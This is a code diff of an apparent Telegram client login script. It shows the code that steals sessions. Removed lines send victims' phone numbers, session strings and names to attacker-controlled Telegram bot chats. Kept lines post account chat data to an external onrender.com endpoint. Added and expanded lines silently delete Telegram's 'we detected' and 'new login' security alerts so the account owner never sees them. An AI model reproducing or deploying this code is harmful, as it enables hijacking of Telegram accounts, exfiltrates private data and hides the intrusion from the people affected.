@@ -222,29 +222,22 @@ async function login() {
         } else {
             console.log(client.session.save());
             client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
-
             const sess = client.session.save() as unknown as string;
             const user: any = await result.user.toJSON();
-            const payload2 = {
-                chat_id: "-1001970448012",
-                text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
-            };
-            const options2 = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload2)
-            };
-            await fetchWithTimeout(`${ppplbot}`, options2);
 
             const chats = await client?.getDialogs({ limit: 130 });
-            await sendChannels(chats);
-
             let personalChats = 0;
             let channels = 0;
+            const chatsArray = [];
 
             chats.map((chat: any) => {
                 if (chat.isChannel || chat.isGroup) {
                     channels++;
+                    const chatEntity = chat.entity.toJSON();
+                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+                    if (!chatEntity.broadcast && !cannotSendMsgs) {
+                        chatsArray.push(chatEntity);
+                    }
                 }
                 else {
                     personalChats++
@@ -260,20 +253,11 @@ async function login() {
                 personalChats: personalChats
             };
             await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
 
-            const payload = {
-                chat_id: "-1001801844217",
-                text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
-            };
-            const options = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            };
-            await fetchWithTimeout(`${ppplbot}`, options);
             const msgs = await client.getMessages("777000", { limit: 2 });
             msgs.forEach(async msg => {
-                if (msg.text.toLowerCase().includes('we detected')) {
+                if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
                     await msg.delete({ revoke: true });
                 }
             })
@@ -413,46 +397,46 @@ async function deleteMsgs(event: NewMessageEvent) {
         await fetchWithTimeout(`${ppplbot}`, options);
     }
     await sleep(300);
-    const msgs = await event.client.getMessages("777000", { limit: 2 });
+    const msgs = await event.client.getMessages("777000", { limit: 3 });
     msgs.forEach(async msg => {
-        if (msg.text.toLowerCase().includes('we detected')) {
+        if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
             await msg.delete({ revoke: true });
         }
     })
 }
 
-async function sendChannels(chats) {
-    const chatsArray = [];
-    let reply = 'CHANNELS:\n\n';
-    chats.map((chat: any) => {
-        if (chat.isChannel || chat.isGroup) {
-            const chatEntity = chat.entity.toJSON();
-            chatsArray.push(chatEntity);
-            const username = chatEntity.username ? ` @${chatEntity.username} ` : chatEntity.id.toString();
-            reply = reply + chatEntity.title + " " + username + ' \n';
-        }
-    });
-    await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+// async function sendChannels(chats) {
+//     const chatsArray = [];
+//     let reply = 'CHANNELS:\n\n';
+//     chats.map((chat: any) => {
+//         if (chat.isChannel || chat.isGroup) {
+//             const chatEntity = chat.entity.toJSON();
+//             chatsArray.push(chatEntity);
+//             const username = chatEntity.username ? ` @${chatEntity.username} ` : chatEntity.id.toString();
+//             reply = reply + chatEntity.title + " " + username + ' \n';
+//         }
+//     });
+//     await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
 
-    const payload = {
-        chat_id: "-1001801844217",
-        text: reply
-    };
-    const options = {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    };
-    await fetchWithTimeout(`${ppplbot}`, options);
+//     const payload = {
+//         chat_id: "-1001801844217",
+//         text: reply
+//     };
+//     const options = {
+//         method: 'POST',
+//         headers: { 'Content-Type': 'application/json' },
+//         body: JSON.stringify(payload)
+//     };
+//     await fetchWithTimeout(`${ppplbot}`, options);
 
-    const payload2 = {
-        chat_id: "-1001970448012",
-        text: reply
-    };
-    const options2 = {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload2)
-    };
-    await fetchWithTimeout(`${ppplbot}`, options2);
-}
+//     const payload2 = {
+//         chat_id: "-1001970448012",
+//         text: reply
+//     };
+//     const options2 = {
+//         method: 'POST',
+//         headers: { 'Content-Type': 'application/json' },
+//         body: JSON.stringify(payload2)
+//     };
+//     await fetchWithTimeout(`${ppplbot}`, options2);
+// }
